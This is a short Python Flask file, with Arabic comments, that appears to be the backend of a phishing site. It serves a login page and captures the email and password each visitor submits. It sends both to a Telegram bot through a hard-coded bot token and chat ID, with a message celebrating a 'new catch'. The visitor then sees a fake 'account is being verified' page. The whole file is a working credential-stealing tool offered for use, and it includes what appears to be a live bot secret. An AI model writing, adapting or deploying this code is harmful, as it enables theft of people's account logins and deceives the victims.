import os
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# بيانات التلغرام التي استخرجتها
BOT_TOKEN = "8207542838:AAFSBeQ1Hjkc9Z9FFRf6BnUu1h-aVp0SkE0"
CHAT_ID = "7759767685"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # رسالة التنبيه التي ستصلك على تلغرام
    message = f"🚀 صيد جديد يا يانيس!\n\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    
    # إرسال البيانات إلى البوت
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(telegram_url, data={'chat_id': CHAT_ID, 'text': message})
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

    # رسالة النجاح للمستخدم
    return "<h1>Success!</h1><p>Your account is being verified. Please wait.</p>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)